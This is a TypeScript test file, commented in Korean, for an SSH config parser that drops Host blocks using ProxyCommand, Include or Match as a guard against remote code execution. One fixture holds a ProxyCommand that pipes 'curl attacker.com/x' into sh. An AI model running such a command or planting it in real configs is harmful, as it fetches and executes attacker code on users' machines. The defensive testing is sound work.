/**
 * ssh_config 파서 — 허용 11키 추출 + 거부 3키 Host 블록 제외.
 * Plan §S2.2 DoD.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { loadSshConfig, ALLOWED_DIRECTIVES, REJECTED_DIRECTIVES } from './config'

let tmpDir: string
let configPath: string

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mw-ssh-config-'))
  configPath = path.join(tmpDir, 'config')
})

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true })
})

describe('loadSshConfig — 파일 부재/존재', () => {
  it('ENOENT → exists:false + hosts:[] (Manual entry 모드)', () => {
    const r = loadSshConfig(path.join(tmpDir, 'absent-config'))
    expect(r.exists).toBe(false)
    expect(r.hosts).toEqual([])
    expect(r.rejected).toEqual([])
  })

  it('허용 directive 만 있는 Host 블록 → 추출 성공', () => {
    fs.writeFileSync(
      configPath,
      [
        'Host myserver',
        '  HostName server.example.com',
        '  Port 2222',
        '  User alice',
        '  IdentityFile ~/.ssh/id_ed25519',
        '  IdentitiesOnly yes',
        '  ServerAliveInterval 60',
        '  ServerAliveCountMax 3',
      ].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.exists).toBe(true)
    expect(r.hosts).toHaveLength(1)
    const h = r.hosts[0]
    expect(h.alias).toBe('myserver')
    expect(h.hostname).toBe('server.example.com')
    expect(h.port).toBe(2222)
    expect(h.user).toBe('alice')
    expect(h.identityFile).toHaveLength(1)
    expect(h.identityFile![0]).toContain('.ssh/id_ed25519') // tilde 확장
    expect(h.identitiesOnly).toBe(true)
    expect(h.serverAliveInterval).toBe(60)
    expect(h.serverAliveCountMax).toBe(3)
    expect(h.proxyJump).toBeUndefined()
  })

  it('ProxyJump 허용 directive — proxyJump 필드에 alias 저장', () => {
    fs.writeFileSync(
      configPath,
      ['Host internal', '  HostName 10.0.0.5', '  ProxyJump bastion'].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts[0].proxyJump).toBe('bastion')
  })
})

describe('loadSshConfig — 거부 directive (DC-4 RCE 방어)', () => {
  it('ProxyCommand 가 있는 Host 블록은 hosts 에서 제외 + rejected 에 기록', () => {
    fs.writeFileSync(
      configPath,
      [
        'Host evil',
        '  HostName target',
        '  ProxyCommand /bin/sh -c "curl attacker.com/x | sh"',
      ].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts).toHaveLength(0)
    expect(r.rejected).toHaveLength(1)
    expect(r.rejected[0].alias).toBe('evil')
    expect(r.rejected[0].reason).toContain('ProxyCommand')
  })

  it('top-level Match 섹션 — hosts 에 포함 안 됨 (line.param !== "Host" 필터로 자동 무시)', () => {
    // S2 Evaluator M-3: ssh-config 라이브러리가 Match 를 top-level Section 으로 파싱하므로
    // 우리의 `line.param === 'Host'` 필터에 자동 무시된다. 라이브러리 업그레이드 시 회귀 감지.
    fs.writeFileSync(
      configPath,
      [
        'Match user alice',
        '  ProxyCommand /bin/sh -c "danger"',
        '',
        'Host normal',
        '  HostName ok.example.com',
      ].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts.map((h) => h.alias)).toEqual(['normal'])
    // Match 섹션의 ProxyCommand 는 우리 파이프라인에 노출되지 않으므로 rejected 에도 없음.
    expect(r.rejected).toHaveLength(0)
  })

  it('Include 가 있는 Host 블록 — 제외', () => {
    // Match 는 ssh_config 문법상 Host 와 동급 블록 starter 라 ssh-config 라이브러리가
    // 별도 Section 으로 파싱한다 → Host 블록 내부에 Match directive 가 섞이지 않는다.
    // 우리 파서는 Host 블록만 hosts 목록에 올리므로 Match 섹션은 **자동적으로 무시** 된다.
    // 따라서 Match 섹션 자체는 드롭다운에 노출되지 않는다 (REJECTED 방어는 Host 내부 Match 에만 해당).
    fs.writeFileSync(
      configPath,
      ['Host has-include', '  HostName a', '  Include ~/.ssh/extra-config'].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts.find((h) => h.alias === 'has-include')).toBeUndefined()
    expect(r.rejected).toHaveLength(1)
    expect(r.rejected[0].alias).toBe('has-include')
    expect(r.rejected[0].reason).toContain('Include')
  })

  it('허용 + 거부 Host 블록 혼재 — 허용만 추출', () => {
    fs.writeFileSync(
      configPath,
      [
        'Host good',
        '  HostName a.example.com',
        '  Port 22',
        '',
        'Host bad',
        '  HostName b.example.com',
        '  ProxyCommand danger',
      ].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts).toHaveLength(1)
    expect(r.hosts[0].alias).toBe('good')
    expect(r.rejected).toHaveLength(1)
    expect(r.rejected[0].alias).toBe('bad')
  })
})

describe('loadSshConfig — Host 패턴 필터링', () => {
  it('Host * 같은 와일드카드 블록은 드롭다운에 노출 안 함', () => {
    fs.writeFileSync(
      configPath,
      ['Host *', '  User defaultuser', '', 'Host specific', '  HostName x.y'].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts.map((h) => h.alias)).toEqual(['specific'])
  })

  it('한 Host 줄에 여러 alias → 각각 엔트리로 확장', () => {
    fs.writeFileSync(
      configPath,
      ['Host h1 h2 h3', '  HostName shared.example.com'].join('\n'),
    )
    const r = loadSshConfig(configPath)
    expect(r.hosts.map((h) => h.alias).sort()).toEqual(['h1', 'h2', 'h3'])
    for (const h of r.hosts) {
      expect(h.hostname).toBe('shared.example.com')
    }
  })
})

describe('상수 export', () => {
  it('ALLOWED_DIRECTIVES 11개', () => {
    expect(ALLOWED_DIRECTIVES.size).toBe(11)
    expect(ALLOWED_DIRECTIVES.has('HostName')).toBe(true)
    expect(ALLOWED_DIRECTIVES.has('ProxyJump')).toBe(true)
  })

  it('REJECTED_DIRECTIVES 3개 — RCE 위험 directive', () => {
    expect(REJECTED_DIRECTIVES.size).toBe(3)
    expect(REJECTED_DIRECTIVES.has('ProxyCommand')).toBe(true)
    expect(REJECTED_DIRECTIVES.has('Include')).toBe(true)
    expect(REJECTED_DIRECTIVES.has('Match')).toBe(true)
  })
})
